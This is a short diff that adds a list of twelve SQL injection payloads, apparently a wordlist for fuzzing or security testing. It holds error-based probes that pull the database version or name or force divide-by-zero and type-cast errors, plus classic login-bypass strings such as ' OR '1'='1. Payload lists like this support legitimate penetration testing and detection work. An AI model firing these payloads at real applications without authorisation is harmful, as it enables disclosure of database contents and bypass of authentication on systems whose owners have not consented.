@@ -1,0 +1,12 @@
+1' AND (SELECT @@version)=1 --
+1' AND (SELECT DATABASE())=1 --
+1' AND EXP(999999999)=1 --
+1' AND FLOOR(1/0)=1 --
+1' AND CAST('abc' AS INT)=1 --
+1' AND CONVERT('abc', SIGNED)=1 --
+1' AND 1/(SELECT 0 FROM DUAL)=1 --
+1' OR 1=1/(0)--
+' OR ''='
+' OR '1'='1
+' OR '1'='1' --
+' OR 'a'='b')--
